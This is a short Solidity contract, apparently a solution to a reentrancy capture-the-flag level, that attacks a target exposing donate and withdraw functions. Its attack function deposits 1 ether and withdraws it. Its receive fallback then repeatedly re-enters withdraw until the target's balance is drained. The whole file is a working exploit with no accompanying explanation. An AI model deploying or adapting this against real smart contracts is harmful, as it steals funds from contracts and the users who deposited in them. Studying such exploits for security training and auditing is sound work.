// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract ReentranceAttacker {
    IReentrance public reentrance;

    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    function attack() external payable returns (bool) {
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);
        return true;
    }

    receive() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
        } else if (address(reentrance).balance > 0) {
            reentrance.withdraw(address(reentrance).balance);
        }
    }
}